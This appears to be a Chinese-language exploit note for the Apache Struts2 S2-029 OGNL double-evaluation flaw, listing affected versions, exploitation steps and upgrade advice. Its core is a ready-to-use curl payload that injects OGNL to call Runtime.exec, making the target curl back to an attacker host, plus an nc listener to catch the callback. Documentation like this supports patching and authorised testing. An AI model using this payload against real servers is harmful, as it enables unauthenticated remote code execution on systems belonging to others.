## 漏洞描述

Struts2 在处理标签属性值时存在二次 OGNL 求值漏洞。当开发者在 JSP 标签中使用 `%{...}` 嵌套可控输入时，攻击者可以注入 OGNL 表达式执行任意代码。

## 影响版本

- Apache Struts 2.0.0 - 2.3.24.1 (除 2.3.20.3)

## 前置条件

- 无需认证
- 需要应用在标签属性中使用了 `%{...}` 表达式

## 利用步骤

1. 寻找使用了 Struts2 标签并在属性中嵌套用户输入的页面
2. 在可控参数中注入 OGNL 表达式
3. 通过 OGNL 调用 Runtime.exec() 执行命令

## Payload

```bash
# 在可控参数中注入 OGNL（需要找到二次解析的输入点）
curl "http://target/vulnerable_action.action?param=%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%2C%40java.lang.Runtime%40getRuntime%28%29.exec%28%27curl+http%3A%2F%2Fattacker_ip%3A8888%2Fs2-029%27%29%29"
```

## 验证方法

```bash
# HTTP 回调验证
nc -lvp 8888
# 发送 payload 后检查是否收到请求
```

## 修复建议

- 升级至 Struts 2.3.24.3+ 或 2.3.28+
